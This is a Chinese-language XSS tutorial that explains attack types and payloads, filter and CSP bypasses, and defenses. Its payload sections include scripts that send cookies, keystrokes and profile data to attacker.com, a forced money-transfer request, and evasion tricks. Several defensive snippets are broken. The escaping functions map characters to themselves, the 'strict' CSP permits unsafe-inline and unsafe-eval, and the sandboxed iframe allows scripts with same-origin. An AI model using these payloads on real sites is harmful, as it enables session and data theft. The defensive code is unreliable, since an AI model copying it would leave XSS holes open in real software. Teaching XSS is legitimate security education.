# 跨站脚本

## 1. XSS攻击原理

### 1.1 基本概念

XSS（Cross-Site Scripting）是一种允许攻击者在受害者的浏览器中执行恶意脚本的漏洞。攻击者通过web应用程序向用户发送恶意代码，通常以浏览器端脚本的形式。

### 1.2 产生原因

- **用户输入未充分过滤和转义**
- **动态内容渲染不当**
- **CSP（内容安全策略）缺失或配置错误**
- **HTTPOnly标志未设置**

### 1.3 攻击流程

`攻击者构造恶意输入 → 应用存储/反射恶意代码 → 用户访问包含恶意代码的页面 → 浏览器执行恶意脚本 → 窃取信息/执行操作`

## 2. XSS分类

### 2.1 反射型XSS（非持久型）

- **特点**：恶意脚本来自当前HTTP请求
- **存储位置**：URL参数、表单输入
- **影响范围**：单个用户

#### 2.1.1 示例

```http
http://example.com/search?q=<script>alert('XSS')</script>
```

### 2.2 存储型XSS（持久型）

- **特点**：恶意脚本存储在服务器上
- **存储位置**：数据库、文件系统、评论区域
- **影响范围**：所有访问受影响页面的用户

#### 2.2.2 示例

```html
<!-- 恶意评论存储在数据库中 -->
<script>stealCookie()</script>
```

<!-- 恶意评论存储在数据库中 -->

### 2.3 DOM型XSS

- **特点**：客户端脚本处理不当导致
- **存储位置**：不涉及服务端存储
- **影响范围**：依赖于用户交互

#### 2.3.1 示例

```javascript
// 漏洞代码
document.write('<div>' + userInput + '</div>');

// 攻击
userInput = '<script>maliciousCode()</script>'
```

## 3. XSS攻击载荷

### 3.1 基础攻击载荷

```html
<script>alert('XSS')</script>
<svg onload=alert('XSS')>
```

### 3.2 Cookie窃取

```javascript
<script>
var img = new Image();
img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```

### 3.3 键盘记录

```javascript
<script>
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/log', true);
    xhr.send(e.key);
}
</script>
```

### 3.4 会话劫持

```javascript
<script>
fetch('/api/user/profile')
  .then(response => response.json())
  .then(data => {
      fetch('http://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
      });
  });
</script>
```

## 4. 绕过技术

### 4.1 基础过滤绕过

#### 4.1.1 大小写混合

```html
<ScRiPt>alert('XSS')</sCrIpT>
```

#### 4.1.2 标签属性分割

```html
<img src="x:g" onerror="alert('XSS')">
```

#### 4.1.3 编码绕过

```html
<!-- HTML实体编码 -->
<script>alert('XSS')</script>

<!-- URL编码 -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Unicode编码 -->
<script>alert('XSS')</script>
```

<!-- Unicode编码 -->

### 4.2 事件处理器绕过

```html
<!-- 多种事件处理器 -->
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
```

<!-- 多种事件处理器 -->

### 4.3 JavaScript执行上下文绕过

#### 4.3.1 字符串连接

```javascript
<script>eval('al' + 'ert' + '(1)')</script>
```

#### 4.3.2 反引号模板

```javascript
<script>`${alert(1)}`</script>
```

#### 4.3.3 Location哈希

```javascript
<script>eval(location.hash.slice(1))</script>
访问：http://example.com/#alert(1)
```

### 4.4 CSP绕过技术

#### 4.4.1 JSONP端点滥用

```html
<script src="/api/user?callback=alert(1)"></script>
```

#### 4.4.2 AngularJS沙箱逃逸

```html
<div ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>
```

#### 4.4.3 预加载扫描器

```html
<link rel="preload" href="http://attacker.com" onload=alert(1)>
```

## 5. 高级利用技术

### 5.1 盲XSS

```javascript
// 存储型XSS，但无法直接看到执行结果
<script>
fetch('http://attacker.com/collect?data=' + btoa(document.cookie));
</script>
```

### 5.2 XSS与CSRF结合

```javascript
<script>
// 自动发起转账请求
fetch('/transfer', {
    method: 'POST',
    body: 'to=attacker&amount=1000',
    credentials: 'include'
});
</script>
```

### 5.3 基于DOM的XSS链

```javascript
// 利用多个DOM操作点
var input = location.hash.substr(1);
document.getElementById('output').innerHTML = input;
eval(decodeURIComponent(input));
```

## 6. 防御措施

### 6.1 输入验证

#### 6.1.1 白名单验证

```javascript
function validateInput(input) {
 // 只允许字母数字和有限符号
 const pattern = /^[a-zA-Z0-9\s.,!?-]+$/;
 return pattern.test(input);
}
```

#### 6.1.2 上下文感知转义

```javascript
// HTML上下文
function escapeHTML(str) {
 return str.replace(/[&<>"']/g, function(match) {
 return {
 '&': '&',
 '<': '<',
 '>': '>',
 '"': '"',
 "'": '&#x27;'
 }[match];
 });
}

// JavaScript上下文
function escapeJS(str) {
 return str.replace(/[\\'"\n\r]/g, function(match) {
 return {
 '\\': '\\\\',
 "'": "\\'",
 '"': '\\"',
 '\n': '\\n',
 '\r': '\\r'
 }[match];
 });
}
```

### 6.2 输出编码

#### 6.2.1 不同上下文的编码

```html
<!-- HTML正文 -->
<div><%= encodeHTML(userInput) %></div>

<!-- HTML属性 -->
<input value="<%= encodeHTML(attributeValue) %>">

<!-- JavaScript -->
<script>
var userData = "<%= encodeJS(jsData) %>";
</script>

<!-- URL -->
<a href="/search?q=<%= encodeURIComponent(query) %>">Search</a>
```

<!-- HTML正文 -->

### 6.3 内容安全策略（CSP）

#### 6.3.1 严格CSP配置

```http
Content-Security-Policy: 
default-src 'self';
 script-src 'self' 'unsafe-inline' 'unsafe-eval';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: https:;
 connect-src 'self';
 font-src 'self';
 object-src 'none';
 media-src 'none';
 frame-src 'none';
 base-uri 'self';
 form-action 'self';
```

#### 6.3.2 非基于脚本的CSP

```http
Content-Security-Policy: 
default-src 'none';
 script-src 'nonce-random123';
 style-src 'self';
 img-src 'self';
```

### 6.4 Cookie安全

#### 6.4.1 HttpOnly标志

```javascript
// 设置HttpOnly Cookie
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

#### 6.4.2 SameSite属性

```javascript
Set-Cookie: sessionId=abc123; SameSite=Strict
Set-Cookie: csrfToken=xyz789; SameSite=Lax
```

### 6.5 现代前端框架防护

#### 6.5.1 React自动转义

```jsx
function SafeComponent({ userInput }) {
 // React自动转义内容
 return <div>{userInput}</div>;
}

// 危险情况使用dangerouslySetInnerHTML
function DangerousComponent({ htmlContent }) {
 return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}
```

#### 6.5.2 Vue.js内容绑定

```html
<template>
  <!-- 自动转义 -->
  <div>{{ userInput }}</div>

  <!-- 原始HTML -->
  <div v-html="trustedHTML"></div>
</template>
```

### 6.6 安全头部

#### 6.6.1 完整的安全头部配置

```http
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
```

## 7. 测试和检测

### 7.1 手动测试Payloads

```javascript
// 基础测试
<script>alert(1)</script>
<img src=x onerror=alert(1)>

// 无标签测试
" onmouseover="alert(1)
'; alert(1)//

// DOM XSS测试
#<img src=x onerror=alert(1)>
javascript:alert(1)
```

### 7.2 自动化测试工具

- **Burp Suite Scanner** - 自动化漏洞扫描

- **XSStrike** - 高级XSS检测工具

- **DOMinator** - DOM XSS测试工具

- **BeEF** - 浏览器利用框架

### 7.3 代码审计工具

- **ESLint security** - JavaScript代码安全检查

- **Semgrep** - 语义化代码搜索

- **CodeQL** - GitHub代码分析引擎

## 8. 最佳实践

### 8.1 开发阶段

1. **对所有用户输入进行验证和转义**

2. **实施严格的CSP策略**

3. **使用安全的框架和模板引擎**

4. **进行安全代码审查**

### 8.2 安全编码规范

```javascript
// 安全示例
const safe = {
 // HTML转义
 html: (str) => str.replace(/[&<>"']/g, this.replaceHTML),


// 属性转义
attr: (str) => str.replace(/[&<>"']/g, this.replaceHTML),

// JavaScript转义
js: (str) => str.replace(/[\\'"\n\r]/g, this.replaceJS),

replaceHTML: (char) => ({
    '&': '&', '<': '<', '>': '>',
    '"': '"', "'": '&#x27;'
})[char]),

replaceJS: (char) => ({
    '\\': '\\\\', "'": "\\'", '"': '\\"',
    '\n': '\\n', '\r': '\\r'
})[char])

};
```

### 8.3 运维配置

1. **配置安全的HTTP头部**

2. **实施WAF规则**

3. **定期安全扫描**

4. **监控异常请求**

## 9. 应急响应

### 9.1 发现XSS攻击

1. **立即移除恶意内容**

2. **分析攻击向量和影响范围**

3. **重置受影响用户的会话**

4. **通知相关用户**

### 9.2 修复流程

```javascript
// 1. 识别漏洞点
const vulnerableCode = document.write(userInput);

// 2. 实施修复
const safeCode = document.textContent = escapeHTML(userInput);

// 3. 验证修复
// 使用自动化测试验证修复效果
```

### 9.3 后续防护

1. **增强输入验证规则**

2. **更新CSP策略**

3. **加强安全监控**

4. **进行团队安全培训**

## 10. 进阶防护技术

### 10.1 子资源完整性（SRI）

```html
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R8GqS..."
  crossorigin="anonymous">
</script>
```

### 10.2 Trusted Types API

```javascript
// 启用Trusted Types
if (window.trustedTypes && trustedTypes.createPolicy) {
    const escapePolicy = trustedTypes.createPolicy('escapePolicy', {
        createHTML: (input) => input.replace(/</g, '<')
    });
}
```

### 10.3 沙箱iframe

```html
<iframe 
  src="untrusted-content.html" 
  sandbox="allow-scripts allow-same-origin">
</iframe>
```
